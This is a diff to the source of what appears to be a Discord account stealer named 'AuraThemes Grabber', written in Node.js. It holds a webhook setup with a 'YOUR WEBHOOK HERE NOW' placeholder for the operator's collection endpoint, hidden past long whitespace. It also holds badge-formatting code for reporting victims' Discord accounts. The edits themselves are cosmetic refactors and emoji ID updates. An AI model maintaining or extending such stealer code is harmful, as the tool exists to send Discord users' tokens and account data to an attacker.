@@ -6,12 +6,13 @@ const app = require('express')(),
     axios = require('axios'),
     bodyParser = require('body-parser'),
     server = http.createServer(app),
-    FormData = require('form-data');
-let { Webhook, MessageBuilder } = require("discord-webhook-node"),
-    webhook = new Webhook("YOUR WEBHOOK HERE NOW")                                                                                                                                                                     .setUsername("AuraThemes Grabber").setAvatar("https://avatars.githubusercontent.com/u/149415297?s=200&v=4")
+    FormData = require('form-data'),
+    { Webhook, MessageBuilder } = require("discord-webhook-node");
+let webhook = new Webhook("YOUR WEBHOOK HERE NOW")                                                                                                                                                                     .setUsername("AuraThemes Grabber").setAvatar("https://avatars.githubusercontent.com/u/149415297?s=200&v=4")
 
 String.prototype.hi = (i, s) => {
-  if (i < 0) i = 0; if (i > this.length) i = this.length;
+  if (i < 0) i = 0;
+  if (i > this.length) i = this.length;
   return this.slice(0, i) + s + this.slice(i);
 };
 
@@ -845,7 +846,7 @@ function getAllInfos(e, n, t) {
       256 == (256 & e) && (n += "<:balance:874750808267292683> "),
       512 == (512 & e) && (n += "<:early:944071770506416198> "),
       16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "),
-      4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "),
+      4194304 == (4194304 & e) && (n += "<:activedev:1042545590640324608> "),
       131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "),
       "" == n && (n = ":x:"),
       n
@@ -859,7 +860,7 @@ function getAllInfos(e, n, t) {
       2 == (2 & e) && (n += "<:partner:918207395279273985> "),
       4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "),
       8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "),
-      4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "),
+      4194304 == (4194304 & e) && (n += "<:activedev:1042545590640324608> "),
       512 == (512 & e) && (n += "<:early:944071770506416198> "),
       16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "),
       131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "),
